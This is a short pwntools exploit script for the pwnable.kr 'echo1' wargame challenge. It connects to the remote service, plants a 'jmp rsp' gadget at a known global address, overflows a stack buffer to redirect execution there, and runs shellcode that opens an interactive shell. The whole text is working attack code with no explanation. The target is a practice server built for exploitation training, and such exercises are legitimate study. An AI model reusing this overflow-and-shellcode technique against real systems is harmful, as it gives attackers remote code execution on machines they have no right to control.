from pwn import *

context(log_level="debug", arch="amd64", os="linux")

# r = process("./echo1")
r = remote("pwnable.kr", 9010)
r.recvuntil(b": ")
r.sendline(asm("jmp rsp"))
r.recvuntil(b"> ")
r.sendline(b"1")
r.sendline(cyclic(0x28) + p64(0x6020A0) + asm(shellcraft.sh()))
r.interactive()
